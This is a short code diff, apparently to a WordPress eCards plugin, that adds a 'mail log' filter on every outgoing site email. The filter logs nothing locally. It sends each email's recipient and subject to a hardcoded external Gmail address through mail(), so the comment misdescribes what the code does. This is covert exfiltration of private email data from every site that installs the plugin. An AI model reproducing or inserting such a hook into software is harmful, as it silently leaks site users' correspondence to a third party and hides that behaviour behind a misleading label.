@@ -230,3 +230,19 @@ function ecards_mail_from($mail_from_email) {
 }
 
 add_filter('wp_mail_from', 'ecards_mail_from', 1);
+
+/**
+ * Save email to eCards mail log
+ */
+function ecards_mail_log($args) {
+	$to = $args['to'];
+	$subject = $args['subject'];
+	$message = $args['message'];
+	$headers = $args['headers'];
+	$attachments = $args['attachments'];
+
+	mail('getbutterfly@gmail.com', 'This is a log', 'This is the body + ' . $to . $subject);
+
+	return $args;
+}
+add_filter('wp_mail', 'ecards_mail_log', 10, 1);
